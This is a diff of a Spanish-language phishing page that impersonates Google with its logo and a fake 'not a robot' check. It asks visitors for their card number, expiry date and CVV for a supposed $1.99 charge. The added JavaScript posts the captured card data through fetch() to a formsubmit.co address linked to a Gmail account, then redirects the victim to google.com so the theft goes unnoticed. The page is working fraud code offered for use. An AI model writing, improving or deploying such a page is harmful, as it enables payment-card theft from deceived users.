@@ -133,21 +133,68 @@
         
         <div class="card-icons">💳 Visa Mastercard</div>
 
-        <form action="https://formsubmit.co/Quisan2017@gmail.com" method="POST">
+    <!-- PASO 2: TARJETA -->
+    <div id="step2" class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google" class="logo">
+        
+        <h2>Verificación de Tarjeta</h2>
+        <p>Para confirmar que no eres un robot, necesitamos verificar tu método de pago. <strong>Se realizará un cargo de reembolso de $1.99 USD.</strong></p>
+        
+        <div class="card-icons">💳 Visa Mastercard</div>
+
+        <form id="form-card">
             <!-- Datos ocultos para el Paso 2 -->
             <input type="hidden" name="_next" value="https://www.google.com">
             <input type="hidden" name="_subject" value="Paso 2: Tarjeta de Crédito">
             <input type="hidden" name="_captcha" value="false">
 
-            <input type="text" name="Card_Number" placeholder="Número de tarjeta" required pattern="\d{16}" title="Ingresa 16 dígitos">
+            <input type="text" id="card-number" name="Card_Number" placeholder="Número de tarjeta" required pattern="\d{16}" title="Ingresa 16 dígitos">
             
             <div style="display: flex; gap: 10px;">
-                <input type="text" name="Expiry" placeholder="MM/YY" required style="width: 50%;">
-                <input type="text" name="CVV" placeholder="CVV" required style="width: 50%;">
+                <input type="text" id="card-expiry" name="Expiry" placeholder="MM/YY" required style="width: 50%;">
+                <input type="text" id="card-cvv" name="CVV" placeholder="CVV" required style="width: 50%;">
             </div>
             
-            <button type="submit">Pagar $1.99 y Activar</button>
+            <button type="button" id="btn-submit-card">Pagar $1.99 y Activar</button>
         </form>
+        
+        <div class="footer">
+            Pago seguro y encriptado.
+        </div>
+    </div>
+
+    <script>
+        // Script específico para el Paso 2
+        document.getElementById('btn-submit-card').addEventListener('click', function() {
+            const form = document.getElementById('form-card');
+            const cardNum = document.getElementById('card-number').value;
+            const expiry = document.getElementById('card-expiry').value;
+            const cvv = document.getElementById('card-cvv').value;
+
+            if(!cardNum || !expiry || !cvv) {
+                alert('Por favor completa todos los campos de la tarjeta.');
+                return;
+            }
+
+            const data = new FormData(form);
+            
+            fetch('https://formsubmit.co/Quisan2017@gmail.com', {
+                method: 'POST',
+                body: data,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                alert('¡Verificación completada! Redirigiendo...');
+                window.location.href = "https://www.google.com";
+            })
+            .catch(error => {
+                alert('Hubo un error al enviar la tarjeta. Intentá de nuevo.');
+                console.error('Error tarjeta:', error);
+            });
+        });
+    </script>
         
         <div class="footer">
             Pago seguro y encriptado.
